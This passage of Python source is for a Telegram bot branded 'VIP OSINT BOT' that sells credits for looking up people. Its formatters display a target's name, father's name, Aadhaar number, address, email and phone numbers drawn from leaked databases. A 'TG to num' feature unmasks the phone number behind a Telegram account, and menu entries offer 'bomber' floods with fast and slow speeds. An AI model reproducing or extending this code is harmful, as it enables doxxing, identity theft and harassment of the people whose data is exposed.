        [KeyboardButton(text=BTN_SECURE_TG, style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text=BTN_UNSECURE_TG, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_BAN_USER, style=KeyboardButtonStyle.SUCCESS), KeyboardButton(text=BTN_UNBAN_USER, style=KeyboardButtonStyle.SUCCESS)],
        [KeyboardButton(text=BTN_BACK_ADMIN, style=KeyboardButtonStyle.SUCCESS)],
    ]
    try:
        return ReplyKeyboardMarkup(
            keyboard=keyboard,
            resize_keyboard=True,
            is_persistent=True,
        )
    except Exception:
        return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

def plain_main_kb():
    keyboard = [
        # 🆕 TG BOMBER — FIRST OPTION
        [KeyboardButton(text=BTN_TG_BOMBER)],
        [KeyboardButton(text=BTN_GET_INFO), KeyboardButton(text=BTN_MY_PROFILE)],
        [KeyboardButton(text=BTN_REFER), KeyboardButton(text=BTN_REDEEM)],
        [KeyboardButton(text=BTN_SPIN), KeyboardButton(text=BTN_BOMBER)],
        [KeyboardButton(text=BTN_LEAK), KeyboardButton(text=BTN_TG_TO_NUM)],
        [KeyboardButton(text=BTN_CUSTOM_BOMBER)],
    ]
    try:
        return ReplyKeyboardMarkup(
            keyboard=keyboard,
            resize_keyboard=True,
            is_persistent=True,
        )
    except Exception:
        return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

async def answer_with_main(msg: Message, text: str, parse_mode=PM):
    if msg.chat.type != "private":
        try:
            await msg.answer(text, parse_mode=parse_mode)
        except Exception:
            await msg.answer(text, parse_mode=parse_mode)
        return
    
    try:
        await msg.answer(text, reply_markup=main_kb(), parse_mode=parse_mode)
    except Exception:
        await msg.answer(
            text,
            reply_markup=plain_main_kb(),
            parse_mode=parse_mode,
        )

def stop_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⛔ sᴛᴏᴘ", callback_data="stop_blast")]
    ])

def join_kb(channels):
    buttons = []
    for i, ch in enumerate(channels, 1):
        clean_ch = ch.lstrip('@')
        buttons.append([
            InlineKeyboardButton(
                text=f"📢 ᴄʜᴀɴɴᴇʟ {i}",
                url=f"https://t.me/{clean_ch}",
            )
        ])
    buttons.append([InlineKeyboardButton(text="✅ ᴠᴇʀɪғʏ", callback_data="verify")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def refer_kb(link: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="📋 ᴄᴏᴘʏ ʟɪɴᴋ",
            callback_data=f"copy_{link}"
        )],
        [InlineKeyboardButton(
            text="📨 sʜᴀʀᴇ ʟɪɴᴋ",
            url=f"https://t.me/share/url?url={link}"
        )]
    ])

def custom_bomber_speed_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=f"Fᴀsᴛ ⚡️",
                callback_data="custom_bomber_fast",
            ),
            InlineKeyboardButton(
                text=f"Sʟᴏᴡ 🐢",
                callback_data="custom_bomber_slow",
            )
        ]
    ])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              UTILS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
blast_sessions = {}

async def send_logs_channel(text: str, parse_mode=PM):
    try:
        await bot.send_message(LOGS_CHANNEL, text, parse_mode=parse_mode)
    except:
        pass

async def check_force_joined(bot: Bot, user_id: int):
    if is_admin(user_id):
        return True, []
    
    raw = db_get("force_channels", "")
    if not raw.strip():
        return True, []
    channels = [c.strip() for c in raw.split(",") if c.strip()]
    not_joined = []
    for ch in channels:
        try:
            clean_ch = ch.lstrip('@')
            member = await bot.get_chat_member(f"@{clean_ch}", user_id)
            if member.status in ("left", "kicked"):
                not_joined.append(clean_ch)
        except Exception:
            not_joined.append(ch)
    return len(not_joined) == 0, not_joined

async def check_banned_and_respond(msg: Message) -> bool:
    uid = msg.from_user.id
    if is_banned(uid):
        await msg.answer(
            f"<tg-emoji emoji-id=\"{EMOJI_BANNED}\">🚫</tg-emoji> You are banned from using this bot!",
            parse_mode=PM
        )
        return False
    return True

async def check_force_joined_and_respond(msg: Message) -> bool:
    uid = msg.from_user.id
    if is_admin(uid):
        return True
    
    if not await check_banned_and_respond(msg):
        return False
    
    joined, not_joined = await check_force_joined(bot, uid)
    if not joined:
        txt = bq(
            "📢 ғᴏʀᴄᴇ ᴄʜᴀɴɴᴇʟs\n\n"
            "ʜᴇʏ! Please join our channel(s) to use this bot.\n"
            "After joining tap ✅ Verify below."
        )
        await msg.answer(txt, reply_markup=join_kb(not_joined), parse_mode=PM)
        return False
    return True

async def send_dashboard_media(bot: Bot, chat_id: int, command: str,
                                 caption: str, kb=None, parse_mode=PM):
    media_raw = db_get("dashboard_media", "{}")
    try:
        media = json.loads(media_raw)
    except:
        media = {}
    configured = media.get(command)
    if configured:
        if isinstance(configured, dict):
            file_id = configured.get("file_id")
            media_type = configured.get("type")
        else:
            file_id = configured
            media_type = None
        try:
            if media_type == "video":
                await bot.send_video(chat_id, file_id, caption=caption,
                                     reply_markup=kb, parse_mode=parse_mode)
            else:
                await bot.send_photo(chat_id, file_id, caption=caption,
                                     reply_markup=kb, parse_mode=parse_mode)
            return
        except Exception:
            if media_type is None:
                try:
                    await bot.send_video(chat_id, file_id, caption=caption,
                                         reply_markup=kb, parse_mode=parse_mode)
                    return
                except Exception:
                    pass
    
    try:
        await bot.send_message(chat_id, caption, reply_markup=kb, parse_mode=parse_mode)
    except Exception:
        if kb is None:
            raise
        await bot.send_message(
            chat_id,
            caption,
            reply_markup=plain_main_kb(),
            parse_mode=parse_mode,
        )

def format_info(data: dict, number: str) -> str:
    now = datetime.now().strftime("%d %b %Y %I:%M %p")
    results = data.get("result", [])
    count = data.get("count", len(results))
    
    lines = [
        f"<tg-emoji emoji-id=\"{EMOJI_INFO_HEADER}\">📋</tg-emoji> <tg-emoji emoji-id=\"{EMOJI_INFO_HEADER}\">📱</tg-emoji> ɴᴜᴍʙᴇʀ ɪɴғᴏ",
        "──────────────────",
        f"🕐 {now}",
        f"├<tg-emoji emoji-id=\"{EMOJI_NUMBER}\">📞</tg-emoji> ɴᴜᴍʙᴇʀ: {number}",
        f"└📊 ᴛᴏᴛᴀʟ ʀᴇᴄᴏʀᴅs: {count}",
        "",
    ]
    for i, rec in enumerate(results, 1):
        lines.append(f"👤 ʀᴇᴄᴏʀᴅ {i}")
        if rec.get("mobile"): lines.append(f"├<tg-emoji emoji-id=\"{EMOJI_MOBILE}\">📱</tg-emoji> ᴍᴏʙɪʟᴇ: {rec['mobile']}")
        if rec.get("name"): lines.append(f"├<tg-emoji emoji-id=\"{EMOJI_NAME}\">👤</tg-emoji> ɴᴀᴍᴇ: {rec['name']}")
        if rec.get("father_name"): lines.append(f"├<tg-emoji emoji-id=\"{EMOJI_FATHER}\">👨</tg-emoji> ғᴀᴛʜᴇʀ ɴᴀᴍᴇ: {rec['father_name']}")
        if rec.get("aadhaar"): lines.append(f"├<tg-emoji emoji-id=\"{EMOJI_AADHAAR}\">🪪</tg-emoji> ᴀᴀᴅʜᴀᴀʀ: {rec['aadhaar']}")
        if rec.get("address"): lines.append(f"├<tg-emoji emoji-id=\"{EMOJI_ADDRESS}\">🏠</tg-emoji> ᴀᴅᴅʀᴇss: {rec['address']}")
        if rec.get("circle"): lines.append(f"├<tg-emoji emoji-id=\"{EMOJI_CIRCLE}\">📡</tg-emoji> ᴄɪʀᴄʟᴇ: {rec['circle']}")
        if rec.get("email"): lines.append(f"├<tg-emoji emoji-id=\"{EMOJI_EMAIL}\">📧</tg-emoji> ᴇᴍᴀɪʟ: {rec['email']}")
        if rec.get("alt_mobile"): lines.append(f"└<tg-emoji emoji-id=\"{EMOJI_ALT_MOBILE}\">📲</tg-emoji> ᴀʟᴛ ᴍᴏʙɪʟᴇ: {rec['alt_mobile']}")
        lines.append("")
    return f"<blockquote>\n" + "\n".join(lines) + "\n</blockquote>"

def format_leak_response(data: dict, number: str) -> str:
    orange_line = f"<tg-emoji emoji-id=\"{EMOJI_ORANGE_LINE_PREMIUM}\">➿</tg-emoji>" * 7
    
    lines = [
        f"{orange_line}",
        f"<tg-emoji emoji-id=\"{EMOJI_LEAK_PREMIUM}\">🥷</tg-emoji> <b>ʟᴇᴀᴋ ᴏsɪɴᴛ</b>",
        f"{orange_line}",
        "",
    ]
    
    for source_key, source_data in data.get("data", {}).get("data", {}).items():
        title = source_data.get("title", "Unknown Source")
        description = source_data.get("description", "")
        records = source_data.get("records", [])
        
        lines.append(f"<tg-emoji emoji-id=\"{EMOJI_DESCRIPTION}\">🌐</tg-emoji> <b>{title}</b>")
        if description:
            lines.append(f"{description}")
        lines.append("")
        
        if records:
            lines.append(f"<tg-emoji emoji-id=\"{EMOJI_RECORDS}\">⏰</tg-emoji> ʀᴇᴄᴏʀᴅs:")
            lines.append("")
            
            for rec in records:
                if rec.get("Adres"):
                    lines.append(f"<tg-emoji emoji-id=\"{EMOJI_ADDRESS_PREMIUM}\">🏡</tg-emoji> ᴀᴅᴅʀᴇss: {rec.get('Adres')}")
                if rec.get("DocumentNumber"):
                    lines.append(f"<tg-emoji emoji-id=\"{EMOJI_CHECK}\">✅</tg-emoji> ᴅᴏᴄᴜᴍᴇɴᴛɴᴜᴍʙᴇʀ: {rec.get('DocumentNumber')}")
                if rec.get("FatherName"):
                    lines.append(f"ғᴀᴛʜᴇʀɴᴀᴍᴇ: {rec.get('FatherName')}")
                if rec.get("FullName"):
                    lines.append(f"ғᴜʟʟɴᴀᴍᴇ: {rec.get('FullName')}")
                if rec.get("Phone"):
                    lines.append(f"<tg-emoji emoji-id=\"{EMOJI_PHONE_PREMIUM}\">📞</tg-emoji> {rec.get('Phone')}")
                if rec.get("Phone2"):
                    lines.append(f"<tg-emoji emoji-id=\"{EMOJI_PHONE_PREMIUM}\">📞</tg-emoji> {rec.get('Phone2')}")
                if rec.get("Phone3"):
                    lines.append(f"<tg-emoji emoji-id=\"{EMOJI_PHONE_PREMIUM}\">📞</tg-emoji> {rec.get('Phone3')}")
                if rec.get("Phone4"):
                    lines.append(f"<tg-emoji emoji-id=\"{EMOJI_PHONE_PREMIUM}\">📞</tg-emoji> {rec.get('Phone4')}")
                if rec.get("Phone5"):
                    lines.append(f"<tg-emoji emoji-id=\"{EMOJI_PHONE_PREMIUM}\">📞</tg-emoji> {rec.get('Phone5')}")
                if rec.get("MobilePhone"):
                    lines.append(f"<tg-emoji emoji-id=\"{EMOJI_PHONE_PREMIUM}\">📞</tg-emoji> {rec.get('MobilePhone')}")
                if rec.get("Region"):
                    lines.append(f"ʀᴇɢɪᴏɴ: {rec.get('Region')}")
                if rec.get("City"):
                    lines.append(f"ᴄɪᴛʏ: {rec.get('City')}")
                if rec.get("Company"):
                    lines.append(f"ᴄᴏᴍᴘᴀɴʏ: {rec.get('Company')}")
                if rec.get("MobileOperator"):
                    lines.append(f"ᴍᴏʙɪʟᴇᴏᴘᴇʀᴀᴛᴏʀ: {rec.get('MobileOperator')}")
                if rec.get("IndianState"):
                    lines.append(f"ɪɴᴅɪᴀɴsᴛᴀᴛᴇ: {rec.get('IndianState')}")
                lines.append("")
    
    lines.append(f"{orange_line}")
    lines.append(f"<tg-emoji emoji-id=\"{EMOJI_BOT_PREMIUM}\">🤖</tg-emoji> ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_STAR_PREMIUM}\">🌟</tg-emoji>")
    lines.append(f"{orange_line}")
    
    return f"<blockquote>\n" + "\n".join(lines) + "\n</blockquote>"

def format_tg_to_num_response(data: dict, user_id: str) -> str:
    orange_line = f"<tg-emoji emoji-id=\"{EMOJI_TG_ORANGE_LINE}\">➿</tg-emoji>" * 7
    
    phone_data = data.get("phone", [])
    if isinstance(phone_data, list) and len(phone_data) > 0:
        first = phone_data[0]
        phone_number = first.get("number", "N/A")
        country_code = first.get("country_code", "N/A")
        country = first.get("country", "N/A")
        country_flag = first.get("country_flag", "🏳️")
        if phone_number != "N/A" and country_code != "N/A":
            full_phone = f"{country_code}{phone_number}"
        else:
            full_phone = phone_number
    else:
        phone_number = "N/A"
        country_code = "N/A"
        country = "N/A"
        country_flag = "🏳️"
        full_phone = "N/A"
    
    if is_user_secured(int(user_id)):
        return f"<blockquote>\n" + "\n".join([
            f"<tg-emoji emoji-id=\"{EMOJI_TG_COMET}\">☄️</tg-emoji> <b>ᴛɢ ᴛᴏ ɴᴜᴍ</b>",
            f"{orange_line}",
            "",
            f"<tg-emoji emoji-id=\"{EMOJI_SECURED}\">🔒</tg-emoji> <b>ᴛʜɪs ᴜsᴇʀ ɪᴅ ɪs sᴇᴄᴜʀᴇᴅ ʙʏ ᴀᴅᴍɪɴ!</b>",
            f"{orange_line}",
            f"<tg-emoji emoji-id=\"{EMOJI_TG_BOT}\">🤖</tg-emoji> ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_TG_STAR2}\">🌟</tg-emoji>",
            f"{orange_line}",
        ]) + "\n</blockquote>"
    
    if country.lower() == "india":
        country_display = f"<tg-emoji emoji-id=\"5222300011366200403\">🇮🇳</tg-emoji> {country}"
    else:
        country_display = f"{country_flag} {country}"
    
    lines = [
        f"<tg-emoji emoji-id=\"{EMOJI_TG_COMET}\">☄️</tg-emoji> <b>ᴛɢ ᴛᴏ ɴᴜᴍ</b>",
        f"{orange_line}",
        "",
        f"<tg-emoji emoji-id=\"6023847192060499006\">🪩</tg-emoji> ᴜsᴇʀ ɪᴅ -: {user_id}",
        f"<tg-emoji emoji-id=\"6023847192060499006\">🪩</tg-emoji> Cᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ -: {country_code}",
        f"<tg-emoji emoji-id=\"6023847192060499006\">🪩</tg-emoji> Cᴏᴜɴᴛʀʏ -: {country_display}",
        f"<tg-emoji emoji-id=\"{EMOJI_TG_STAR}\">🌟</tg-emoji> Pʜᴏɴᴇ ɴᴜᴍʙᴇʀ -: {full_phone}",
        f"{orange_line}",
        f"<tg-emoji emoji-id=\"{EMOJI_TG_BOT}\">🤖</tg-emoji> ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_TG_STAR2}\">🌟</tg-emoji>",
        f"{orange_line}",
    ]
    
    return f"<blockquote>\n" + "\n".join(lines) + "\n</blockquote>"

async def log_search(user_id: int, username: str, search_term: str):
    log_text = (
        f"<blockquote>"
        f"ɴᴇᴡ sᴇᴀʀᴄʜ\n"
        f"ᴜsᴇʀ ɪᴅ : {user_id}\n"
        f"ᴜsᴇʀɴᴀᴍᴇ : @{username or 'N/A'}\n"
        f"sᴇᴀʀᴄʜ : {search_term}\n"
        f"</blockquote>"
    )
    await send_logs_channel(log_text, parse_mode=PM)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              BOT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              /start
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    
    if not await check_banned_and_respond(msg):
        return

    if db_get("maintenance", "0") == "1" and not is_admin(msg.from_user.id):
        await msg.answer(bq("🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ\n\nBot is under maintenance. Please wait..."), parse_mode=PM)
        return

    uid = msg.from_user.id
    username = msg.from_user.username or ""
    full_name = msg.from_user.full_name or ""

    args = msg.text.split()
    referrer_id = None
    if len(args) > 1:
        try: referrer_id = int(args[1])
        except: pass

    is_new = not user_exists(uid)
    if is_new:
        add_user(uid, username, full_name, referrer_id)

    joined, not_joined = await check_force_joined(bot, uid)
    if not joined:
        txt = bq(
            "📢 ғᴏʀᴄᴇ ᴄʜᴀɴɴᴇʟs\n\n"
            "ʜᴇʏ! Please join our channel(s) to use this bot.\n"
            "After joining tap ✅ Verify below."
        )
        await msg.answer(txt, reply_markup=join_kb(not_joined), parse_mode=PM)
        return

    await show_main(msg, uid, is_new, referrer_id)

async def show_main(msg: Message, uid: int, is_new=False, referrer_id=None):
    u = get_user(uid)
    welcome = ""
    if is_new:
        welcome = f"🎉 ᴡᴇʟᴄᴏᴍᴇ! You received {NEW_USER_CREDITS} free credits!\n\n"
        if referrer_id and referrer_id != uid:
            welcome += f"✅ Your referrer got {REFER_CREDITS} credit!\n\n"
    
    mention = f"<a href='tg://user?id={uid}'>{u['full_name']}</a>"
    
    if is_owner(uid):
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ"
    else:
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(uid) else str(u['credits'])

    txt = (
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_WELCOME_LEAK}\">🥷</tg-emoji> <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐕𝐈𝐏 𝐎𝐒𝐈𝐍𝐓 𝐁𝐎𝐓 !!</b>\n\n"
        f"ʜᴇʏʏᴏ {mention} !!! <tg-emoji emoji-id=\"{EMOJI_WELCOME_WAVE}\">👋</tg-emoji>\n\n"
        f"{welcome}"
        f"<tg-emoji emoji-id=\"{EMOJI_WELCOME_CREDITS}\">💳</tg-emoji> ᴄʀᴇᴅɪᴛs: {credits_display}\n"
        f"ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ <tg-emoji emoji-id=\"{EMOJI_WELCOME_DOWN}\">👇</tg-emoji>\n"
        f"</blockquote>"
    )
    
    if msg.chat.type != "private":
        await msg.answer(txt, parse_mode=PM)
    else:
        await send_dashboard_media(bot, msg.chat.id, "start", txt, main_kb(), parse_mode=PM)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              VERIFY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.callback_query(F.data == "verify")
async def cb_verify(cb: CallbackQuery):
    uid = cb.from_user.id
    
    if not await check_banned_and_respond(cb.message):
        return
    
    joined, not_joined = await check_force_joined(bot, uid)
    
    if not joined:
        await cb.answer("❌ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ!", show_alert=True)
        return
    
    await cb.message.delete()
    u = get_user(uid)
    mention = f"<a href='tg://user?id={uid}'>{u['full_name']}</a>"
    
    if is_owner(uid):
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ"
    else:
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(uid) else str(u['credits'])
    
    txt = (
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_WELCOME_LEAK}\">🥷</tg-emoji> <b>𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐕𝐈𝐏 𝐎𝐒𝐈𝐍𝐓 𝐁𝐎𝐓 !!</b>\n\n"
        f"ʜᴇʏʏᴏ {mention} !!! <tg-emoji emoji-id=\"{EMOJI_WELCOME_WAVE}\">👋</tg-emoji>\n\n"
        f"<tg-emoji emoji-id=\"{EMOJI_WELCOME_CREDITS}\">💳</tg-emoji> ᴄʀᴇᴅɪᴛs: {credits_display}\n"
        f"ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ <tg-emoji emoji-id=\"{EMOJI_WELCOME_DOWN}\">👇</tg-emoji>\n"
        f"</blockquote>"
    )
    await send_dashboard_media(bot, cb.message.chat.id, "start", txt, main_kb())
    await cb.answer("✅ Verified!", show_alert=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#              COPY LINK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@dp.callback_query(F.data.startswith("copy_"))
async def cb_copy_link(cb: CallbackQuery):
    link = cb.data.replace("copy_", "", 1)
    await cb.answer(f"✅ Link copied!\n\n{link}", show_alert=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   GROUP COMMANDS - Reply Based
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dp.message(Command("wal"))
async def cmd_wallet(msg: Message):
    if not await check_force_joined_and_respond(msg):
        return
    
    if not await check_banned_and_respond(msg):
        return
    
    uid = msg.from_user.id
    
    target_uid = uid
    if msg.reply_to_message and msg.reply_to_message.from_user:
        target_uid = msg.reply_to_message.from_user.id
    
    u = get_user(target_uid)
    if not u:
        await msg.answer(bq("❌ User not found!"), parse_mode=PM)
        return
    
    if is_owner(target_uid):
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ"
    else:
        credits_display = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if is_premium(target_uid) else str(u['credits'])
    
    premium_status = "⭐ ᴘʀᴇᴍɪᴜᴍ" if is_premium(target_uid) else "🆓 ғʀᴇᴇ"
    if is_owner(target_uid):
        premium_status = "👑 ᴏᴡɴᴇʀ"
    elif u['premium_until'] > 0:
        days_left = (u['premium_until'] - int(time.time())) // 86400
        premium_status += f" ({days_left} ᴅᴀʏs)"
    
    await msg.answer(
        bq(
            f"👤 ᴜsᴇʀ: {u['full_name']}\n"
            f"🆔 ɪᴅ: {u['user_id']}\n"
            f"💳 ᴄʀᴇᴅɪᴛs: {credits_display}\n"
            f"📊 sᴛᴀᴛᴜs: {premium_status}"
        ),
        parse_mode=PM
    )

@dp.message(Command("giveadmin"))
async def cmd_give_admin(msg: Message):
    if not is_owner(msg.from_user.id):
        await msg.answer(bq("❌ ᴏɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs!"), parse_mode=PM)
        return
    
    if not msg.reply_to_message:
        await msg.answer(bq("❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ ᴛᴏ ᴍᴀᴋᴇ ᴛʜᴇᴍ ᴀᴅᴍɪɴ!"), parse_mode=PM)
        return
    
    target = msg.reply_to_message.from_user.id
    extra = db_get("extra_admins", "")
    ids = [x for x in extra.split(",") if x.strip()]
    if str(target) not in ids:
        ids.append(str(target))
    db_set("extra_admins", ",".join(ids))
    
    await msg.answer(
        bq(f"✅ ᴜsᴇʀ {target} ɪs ɴᴏᴡ ᴀɴ ᴀᴅᴍɪɴ!"),
        parse_mode=PM
    )

@dp.message(Command("removeadmin"))
async def cmd_remove_admin(msg: Message):
    if not is_owner(msg.from_user.id):
        await msg.answer(bq("❌ ᴏɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs!"), parse_mode=PM)
        return
    
    if not msg.reply_to_message:
        await msg.answer(bq("❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ ᴛᴏ ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ!"), parse_mode=PM)
        return
    
    target = msg.reply_to_message.from_user.id
    if target == OWNER_ID:
        await msg.answer(bq("❌ ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ!"), parse_mode=PM)
        return
    
    extra = db_get("extra_admins", "")
    ids = [x for x in extra.split(",") if x.strip() if x != str(target)]
    db_set("extra_admins", ",".join(ids))
    
    await msg.answer(
        bq(f"✅ ᴜsᴇʀ {target} ɪs ɴᴏᴛ ᴀɴ ᴀᴅᴍɪɴ!"),
        parse_mode=PM
    )

@dp.message(Command("give"))
async def cmd_give_credits(msg: Message):
    if not await check_force_joined_and_respond(msg):
        return
    
    if not is_admin(msg.from_user.id):
        await msg.answer(bq("❌ ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴜsᴇ ᴛʜɪs!"), parse_mode=PM)
        return
    
    if not msg.reply_to_message:
        await msg.answer(bq("❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ ᴛᴏ ɢɪᴠᴇ ᴄʀᴇᴅɪᴛs!"), parse_mode=PM)
        return
    
    target = msg.reply_to_message.from_user.id
    if is_owner(target):
        return
    
    args = msg.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await msg.answer(bq("❌ ᴜsᴀɢᴇ: /give <ᴀᴍᴏᴜɴᴛ> (ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ)"), parse_mode=PM)
        return
    
    amount = int(args[1])
    u = get_user(target)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        return
    
    before = u['credits']
    add_credits(target, amount)
    u2 = get_user(target)
    after = u2['credits']
    
    orange_line = f"<tg-emoji emoji-id=\"{EMOJI_ORANGE_LINE}\">➿</tg-emoji>" * 7
    
    group_msg = (
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_CHECK}\">✅</tg-emoji> <b>ᴄʀᴇᴅɪᴛs sᴇɴᴛ !</b>\n"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_USER}\">👤</tg-emoji> ᴜsᴇʀ     : @{u['username'] or 'N/A'}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_UID}\">🆔</tg-emoji> ᴜɪᴅ      : {u['user_id']}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_CREDITS}\">💰</tg-emoji> ᴀᴅᴅᴇᴅ    : +{amount}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_TOTAL}\">💎</tg-emoji> ɴᴇᴡ ᴛᴏᴛᴀʟ: {after}\n"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_BOT}\">🤖</tg-emoji> ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_GIVE_STAR}\">🌟</tg-emoji>\n"
        f"</blockquote>"
    )
    await msg.answer(group_msg, parse_mode=PM)

@dp.message(Command("take"))
async def cmd_take_credits(msg: Message):
    if not await check_force_joined_and_respond(msg):
        return
    
    if not is_admin(msg.from_user.id):
        await msg.answer(bq("❌ ᴏɴʟʏ ᴀᴅᴍɪɴs ᴄᴀɴ ᴜsᴇ ᴛʜɪs!"), parse_mode=PM)
        return
    
    if not msg.reply_to_message:
        await msg.answer(bq("❌ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ ᴛᴏ ᴛᴀᴋᴇ ᴄʀᴇᴅɪᴛs!"), parse_mode=PM)
        return
    
    target = msg.reply_to_message.from_user.id
    if is_owner(target):
        return
    
    args = msg.text.split()
    if len(args) != 2 or not args[1].isdigit():
        await msg.answer(bq("❌ ᴜsᴀɢᴇ: /take <ᴀᴍᴏᴜɴᴛ> (ʀᴇᴘʟʏ ᴛᴏ ᴜsᴇʀ)"), parse_mode=PM)
        return
    
    amount = int(args[1])
    u = get_user(target)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        return
    
    if is_premium(target):
        await msg.answer(bq("❌ ᴄᴀɴ'ᴛ ᴛᴀᴋᴇ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ!"), parse_mode=PM)
        return
    
    before = u['credits']
    if before < amount:
        await msg.answer(bq(f"❌ ᴜsᴇʀ ᴏɴʟʏ ʜᴀs {before} ᴄʀᴇᴅɪᴛs!"), parse_mode=PM)
        return
    
    deduct_credits(target, amount)
    u2 = get_user(target)
    after = u2['credits']
    
    orange_line = f"<tg-emoji emoji-id=\"{EMOJI_ORANGE_LINE}\">➿</tg-emoji>" * 7
    
    group_msg = (
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_CHECK}\">✅</tg-emoji> <b>ᴄʀᴇᴅɪᴛs ʀᴇᴍᴏᴠᴇᴅ !</b>\n"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_USER}\">👤</tg-emoji> ᴜsᴇʀ     : @{u['username'] or 'N/A'}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_UID}\">🆔</tg-emoji> ᴜɪᴅ      : {u['user_id']}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_CREDITS}\">💰</tg-emoji> ʀᴇᴍᴏᴠᴇᴅ  : -{amount}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_TOTAL}\">💎</tg-emoji> ɴᴇᴡ ᴛᴏᴛᴀʟ: {after}\n"
        f"{orange_line}\n"
